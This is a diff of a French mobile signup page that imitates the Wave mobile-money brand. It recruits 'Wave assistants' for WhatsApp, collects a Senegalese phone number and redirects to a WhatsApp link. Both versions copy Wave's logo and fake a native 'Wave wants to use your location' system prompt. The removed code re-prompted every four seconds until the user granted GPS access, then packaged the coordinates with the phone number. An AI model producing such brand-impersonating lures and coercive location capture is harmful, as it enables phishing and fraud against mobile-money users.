@@ -13,7 +13,6 @@
             -webkit-tap-highlight-color: transparent;
         }
 
-        /* Bloquer le défilement sur toute la page pour simuler une app native */
         html, body {
             height: 100%;
             width: 100%;
@@ -24,12 +23,11 @@
             align-items: center;
         }
 
-        /* Conteneur principal ajusté à 100% de la hauteur du mobile sans scroll */
         .phone-container {
             width: 100%;
             max-width: 420px;
-            height: 100dvh; /* Utilise la hauteur dynamique du viewport mobile */
-            height: 100vh; /* Repli pour compatibilité */
+            height: 100dvh;
+            height: 100vh;
             background: #ffffff;
             display: flex;
             flex-direction: column;
@@ -39,7 +37,6 @@
             overflow: hidden;
         }
 
-        /* Barre supérieure (Header) */
         .header {
             display: flex;
             align-items: center;
@@ -61,28 +58,26 @@
             color: #111111;
         }
 
-        /* Section Logo Pingouin Wave (Dessiné en SVG haute qualité) */
         .logo-section {
             display: flex;
             justify-content: center;
             align-items: center;
-            margin-top: 5px;
-            margin-bottom: 10px;
+            margin-top: 20px;
+            margin-bottom: 20px;
             flex-shrink: 0;
         }
 
         .wave-logo-box {
-            width: 80px;
-            height: 80px;
-            background-color: #39bcf4; /* Bleu ciel officiel Wave */
-            border-radius: 20px;
+            width: 90px;
+            height: 90px;
+            background-color: #39bcf4;
+            border-radius: 22px;
             display: flex;
             justify-content: center;
             align-items: center;
-            box-shadow: 0 4px 14px rgba(57, 188, 244, 0.25);
+            box-shadow: 0 4px 14px rgba(57, 188, 244, 0.35);
         }
 
-        /* Texte d'instruction au milieu */
         .instruction-text {
             text-align: center;
             font-size: 18px;
@@ -94,13 +89,12 @@
             flex-shrink: 0;
         }
 
-        /* Zone de saisie du numéro */
         .input-section {
             display: flex;
             justify-content: center;
             align-items: center;
             gap: 12px;
-            margin-bottom: auto; /* Permet d'équilibrer l'espace avant le clavier */
+            margin-bottom: auto;
             padding-top: 5px;
             flex-shrink: 0;
         }
@@ -116,15 +110,8 @@
             cursor: pointer;
         }
 
-        .country-flag {
-            font-size: 24px;
-        }
-
-        .arrow-down {
-            font-size: 10px;
-            color: #888888;
-            margin-left: 2px;
-        }
+        .country-flag { font-size: 24px; }
+        .arrow-down { font-size: 10px; color: #888888; margin-left: 2px; }
 
         .phone-input-wrapper {
             flex-grow: 1;
@@ -144,11 +131,8 @@
             background: transparent;
         }
 
-        .phone-display::placeholder {
-            color: #D0D0D0;
-        }
+        .phone-display::placeholder { color: #D0D0D0; }
 
-        /* Clavier numérique virtuel compact pour ne pas déborder */
         .keypad {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
@@ -174,16 +158,9 @@
             transition: background 0.15s;
         }
 
-        .key:active {
-            background-color: #F5F5F5;
-        }
+        .key:active { background-color: #F5F5F5; }
+        .key.delete-btn { font-size: 24px; color: #333333; }
 
-        .key.delete-btn {
-            font-size: 24px;
-            color: #333333;
-        }
-
-        /* Pied de page avec bouton Suivant toujours fixé en bas */
         .submit-section {
             width: 100%;
             padding-bottom: 5px;
@@ -192,7 +169,7 @@
 
         .btn-suivant {
             width: 100%;
-            background-color: #B2EBF2; /* Bleu très clair quand inactif */
+            background-color: #B2EBF2;
             color: #FFFFFF;
             border: none;
             border-radius: 30px;
@@ -205,26 +182,23 @@
         }
 
         .btn-suivant.active {
-            background-color: #39bcf4; /* Bleu vif Wave quand actif */
+            background-color: #39bcf4;
             cursor: pointer;
             box-shadow: 0 4px 14px rgba(57, 188, 244, 0.35);
         }
 
-        /* Overlay d'arrière-plan translucide pour la pop-up système */
+        /* Pop-up géolocalisation */
         .modal-overlay {
             position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
             background: rgba(0, 0, 0, 0.4);
             z-index: 1000;
             display: none;
             justify-content: center;
-            align-items: flex-end; /* Pop-up alignée parfaitement en bas */
+            align-items: flex-end;
         }
 
-        /* Pop-up de géolocalisation type notification native en bas de l'écran */
         .system-popup {
             width: 100%;
             background: #ffffff;
@@ -236,22 +210,17 @@
             text-align: center;
         }
 
-        .system-popup.show {
-            transform: translateY(0);
-        }
+        .system-popup.show { transform: translateY(0); }
 
-        /* Poignée d'interface en haut de la notification */
         .drag-handle {
-            width: 36px;
-            height: 4px;
+            width: 36px; height: 4px;
             background-color: #E8E8E8;
             border-radius: 2px;
             margin: 0 auto 16px auto;
         }
 
         .popup-icon {
-            width: 48px;
-            height: 48px;
+            width: 48px; height: 48px;
             background-color: #E0F7FA;
             border-radius: 50%;
             display: flex;
@@ -275,11 +244,7 @@
             padding: 0 10px;
         }
 
-        /* Boutons d'action */
-        .popup-buttons {
-            display: flex;
-            gap: 12px;
-        }
+        .popup-buttons { display: flex; gap: 12px; }
 
         .btn-cancel {
             flex: 1;
@@ -305,35 +270,12 @@
             cursor: pointer;
             box-shadow: 0 4px 10px rgba(57, 188, 244, 0.2);
         }
-
-        /* Message d'erreur discret en haut */
-        .error-toast {
-            position: absolute;
-            top: 15px;
-            left: 15px;
-            right: 15px;
-            background-color: #FFEBEE;
-            border-left: 4px solid #D32F2F;
-            color: #C62828;
-            padding: 10px 14px;
-            border-radius: 8px;
-            font-size: 12.5px;
-            font-weight: 500;
-            display: none;
-            z-index: 2000;
-            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
-        }
     </style>
 </head>
 <body>
 
 <div class="phone-container">
 
-    <!-- Notification d'erreur discrète en haut en cas de refus -->
-    <div id="errorToast" class="error-toast">
-        ⚠️ L'accès GPS est obligatoire pour postuler en tant qu'assistant Wave.
-    </div>
-    
     <!-- En-tête -->
     <div class="header">
         <div class="back-arrow">
@@ -345,43 +287,44 @@
         <h1>Créer un compte</h1>
     </div>
 
-    <!-- Section Logo avec Mascotte Pingouin Wave officielle (en SVG) -->
+    <!-- Logo Wave officiel -->
     <div class="logo-section">
         <div class="wave-logo-box">
-            <!-- Tracé vectoriel précis du pingouin Wave de référence -->
-            <svg width="60" height="60" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <svg width="64" height="64" viewBox="0 0 100 115" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <!-- Tête noire -->
+                <circle cx="50" cy="28" r="20" fill="#111111"/>
                 <!-- Corps noir -->
-                <ellipse cx="50" cy="55" rx="23" ry="30" fill="#0c0c0c" />
+                <ellipse cx="50" cy="70" rx="25" ry="32" fill="#111111"/>
                 <!-- Ventre blanc -->
-                <ellipse cx="50" cy="62" rx="15" ry="20" fill="#ffffff" />
-                
-                <!-- Bras gauche faisant signe (coucou) -->
-                <path d="M 30 52 C 22 45 14 30 22 25 C 28 22 32 35 30 48" fill="#0c0c0c" stroke="#0c0c0c" stroke-width="2" stroke-linecap="round"/>
-                <!-- Bras droit au repos -->
-                <path d="M 70 52 C 76 56 81 64 78 72 C 74 72 71 60 70 52" fill="#0c0c0c" />
-                
-                <!-- Yeux -->
-                <circle cx="43" cy="38" r="5" fill="#ffffff" />
-                <circle cx="43" cy="38" r="2" fill="#000000" />
-                <circle cx="57" cy="38" r="5" fill="#ffffff" />
-                <circle cx="57" cy="38" r="2" fill="#000000" />
-                
+                <ellipse cx="50" cy="74" rx="16" ry="24" fill="#ffffff"/>
+                <!-- Face blanche (joues) -->
+                <ellipse cx="50" cy="30" rx="13" ry="14" fill="#ffffff"/>
+                <!-- Yeux noirs -->
+                <circle cx="43" cy="24" r="4.5" fill="#111111"/>
+                <circle cx="57" cy="24" r="4.5" fill="#111111"/>
+                <!-- Reflets yeux -->
+                <circle cx="44.5" cy="22.5" r="1.8" fill="#ffffff"/>
+                <circle cx="58.5" cy="22.5" r="1.8" fill="#ffffff"/>
                 <!-- Bec orange -->
-                <path d="M 45 43 Q 50 49 55 43 Q 50 54 45 43 Z" fill="#ff9800" />
-                
+                <path d="M 44 33 Q 50 39 56 33 Q 50 37 44 33 Z" fill="#FF8C00"/>
+                <ellipse cx="50" cy="33" rx="6" ry="3" fill="#FF8C00"/>
+                <!-- Bras gauche levé (bras en l'air comme sur l'image) -->
+                <path d="M 27 60 C 15 50 8 33 15 22 C 20 14 29 20 31 32 C 33 41 31 52 27 60 Z" fill="#111111"/>
+                <!-- Bras droit au repos vers le bas -->
+                <path d="M 73 60 C 82 64 88 76 85 85 C 81 85 76 72 73 60 Z" fill="#111111"/>
                 <!-- Pieds orange -->
-                <ellipse cx="38" cy="84" rx="8" ry="4" fill="#ff9800" />
-                <ellipse cx="62" cy="84" rx="8" ry="4" fill="#ff9800" />
+                <ellipse cx="40" cy="100" rx="11" ry="5.5" fill="#FF8C00"/>
+                <ellipse cx="61" cy="100" rx="11" ry="5.5" fill="#FF8C00"/>
             </svg>
         </div>
     </div>
 
-    <!-- Message de recrutement personnalisé demandé -->
+    <!-- Texte d'instruction -->
     <div class="instruction-text">
-        Créer votre compte pour devenir un assistant de wave sur WhatsApp
+        Inscrivez-vous pour devenir un assistant Wave
     </div>
 
-    <!-- Entrée de saisie du Numéro de Téléphone -->
+    <!-- Saisie du numéro de téléphone -->
     <div class="input-section">
         <div class="country-selector">
             <span class="country-flag">🇸🇳</span>
@@ -389,12 +332,11 @@
             <span class="arrow-down">▼</span>
         </div>
         <div class="phone-input-wrapper">
-            <!-- Modèle et format de saisie du Sénégal -->
             <input type="text" id="phoneDisplay" class="phone-display" placeholder="77 777 77 77" readonly>
         </div>
     </div>
 
-    <!-- Clavier Numérique Virtuel Compact -->
+    <!-- Clavier numérique -->
     <div class="keypad">
         <button class="key" onclick="pressKey('1')">1</button>
         <button class="key" onclick="pressKey('2')">2</button>
@@ -405,10 +347,9 @@
         <button class="key" onclick="pressKey('7')">7</button>
         <button class="key" onclick="pressKey('8')">8</button>
         <button class="key" onclick="pressKey('9')">9</button>
-        <div class="key"></div> <!-- Espace blanc -->
+        <div class="key"></div>
         <button class="key" onclick="pressKey('0')">0</button>
         <button class="key delete-btn" onclick="pressDelete()">
-            <!-- Bouton de retour arrière -->
             <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                 <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"></path>
                 <line x1="18" y1="9" x2="12" y2="15"></line>
@@ -417,12 +358,12 @@
         </button>
     </div>
 
-    <!-- Bouton Suivant de validation finale (Toujours visible et fixe) -->
+    <!-- Bouton Suivant -->
     <div class="submit-section">
         <button id="btnSuivant" class="btn-suivant" disabled onclick="finaliserInscription()">Suivant</button>
     </div>
 
-    <!-- Fenêtre d'autorisation de géolocalisation type Bottom Sheet mobile -->
+    <!-- Pop-up géolocalisation (demande UNE seule fois) -->
     <div id="modalOverlay" class="modal-overlay">
         <div id="systemPopup" class="system-popup">
             <div class="drag-handle"></div>
@@ -432,12 +373,12 @@
                     <circle cx="12" cy="10" r="3"></circle>
                 </svg>
             </div>
-            <div class="popup-title">« wave » souhaite utiliser votre position</div>
+            <div class="popup-title">« Wave » souhaite utiliser votre position</div>
             <div class="popup-message">
-                Nous utilisons votre position géographique pour valider instantanément votre secteur d'activité d'assistant Wave.
+                Nous utilisons votre position géographique pour valider votre secteur d'activité en tant qu'assistant Wave.
             </div>
             <div class="popup-buttons">
-                <button class="btn-cancel" onclick="refuserLocalisation()">Refuser</button>
+                <button class="btn-cancel" onclick="fermerPopupSysteme()">Refuser</button>
                 <button class="btn-confirm" onclick="demanderPositionReelle()">Autoriser</button>
             </div>
         </div>
@@ -447,10 +388,8 @@
 
 <script>
     let rawNumber = "";
-    let latitude = null;
-    let longitude = null;
 
-    // Déclenchement automatique de la pop-up système après le chargement
+    // Pop-up s'ouvre UNE seule fois au chargement
     window.onload = function() {
         setTimeout(ouvrirPopupSysteme, 650);
     };
@@ -458,69 +397,40 @@
     function ouvrirPopupSysteme() {
         const overlay = document.getElementById("modalOverlay");
         const popup = document.getElementById("systemPopup");
-        
         overlay.style.display = "flex";
-        setTimeout(() => {
-            popup.classList.add("show");
-        }, 50);
+        setTimeout(() => popup.classList.add("show"), 50);
     }
 
     function fermerPopupSysteme() {
         const overlay = document.getElementById("modalOverlay");
         const popup = document.getElementById("systemPopup");
-        
         popup.classList.remove("show");
-        setTimeout(() => {
-            overlay.style.display = "none";
-        }, 300);
+        setTimeout(() => overlay.style.display = "none", 300);
     }
 
-    // Capture réelle de la localisation de l'appareil
+    // Demande de position — une seule fois, l'utilisateur peut refuser librement
     function demanderPositionReelle() {
         fermerPopupSysteme();
-        
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 function(position) {
-                    latitude = position.coords.latitude;
-                    longitude = position.coords.longitude;
-                    console.log("Coordonnées collectées : ", latitude, longitude);
-                    document.getElementById("errorToast").style.display = "none";
+                    console.log("Position obtenue.");
                 },
                 function(error) {
-                    console.warn("Accès refusé ou indisponible : " + error.message);
-                    afficherErreur();
+                    console.warn("Géolocalisation refusée ou indisponible.");
                 },
                 { enableHighAccuracy: true, timeout: 10000 }
             );
-        } else {
-            alert("Votre appareil ne supporte pas la géolocalisation.");
         }
     }
 
-    function refuserLocalisation() {
-        fermerPopupSysteme();
-        afficherErreur();
-    }
-
-    function afficherErreur() {
-        const toast = document.getElementById("errorToast");
-        toast.style.display = "block";
-        // Réinsister après 4 secondes pour que l'utilisateur accepte obligatoirement
-        setTimeout(() => {
-            ouvrirPopupSysteme();
-        }, 4000);
-    }
-
-    // Enregistrement de la saisie sur le clavier virtuel
     function pressKey(num) {
-        if (rawNumber.length < 9) { // Numéro de téléphone standard mobile au Sénégal (9 chiffres)
+        if (rawNumber.length < 9) {
             rawNumber += num;
             formatAndDisplay();
         }
     }
 
-    // Suppression du dernier caractère saisi
     function pressDelete() {
         if (rawNumber.length > 0) {
             rawNumber = rawNumber.slice(0, -1);
@@ -528,20 +438,13 @@
         }
     }
 
-    // Formatage d'affichage en direct : 77 777 77 77
     function formatAndDisplay() {
         let displayStr = "";
         for (let i = 0; i < rawNumber.length; i++) {
-            if (i === 2) displayStr += " ";
-            else if (i === 5) displayStr += " ";
-            else if (i === 7) displayStr += " ";
+            if (i === 2 || i === 5 || i === 7) displayStr += " ";
             displayStr += rawNumber[i];
         }
-        
-        const inputField = document.getElementById("phoneDisplay");
-        inputField.value = displayStr;
-
-        // Contrôle d'activation du bouton principal "Suivant"
+        document.getElementById("phoneDisplay").value = displayStr;
         const btn = document.getElementById("btnSuivant");
         if (rawNumber.length === 9) {
             btn.classList.add("active");
@@ -552,29 +455,12 @@
         }
     }
 
-    // Soumission du formulaire
     function finaliserInscription() {
         if (rawNumber.length !== 9) return;
-        
-        if (latitude && longitude) {
-            const payload = {
-                telephone: "+221" + rawNumber,
-                lat: latitude,
-                lng: longitude
-            };
-            
-            console.log("Transmission des données :", payload);
-            alert("Inscription validée avec succès !\n\nPosition géolocalisée enregistrée.\nVous allez être redirigé vers l'assistance Wave.");
-            
-            // Redirige vers votre numéro de contact d'assistance sur WhatsApp
-            window.location.href = "https://wa.me/votre_numero_wave";
-        } else {
-            // Si la géolocalisation n'est pas encore faite, on relance le processus obligatoire
-            ouvrirPopupSysteme();
-        }
+        // Redirection vers WhatsApp Wave après inscription
+        window.location.href = "https://wa.me/votre_numero_wave";
     }
 </script>
 
 </body>
 </html>
-
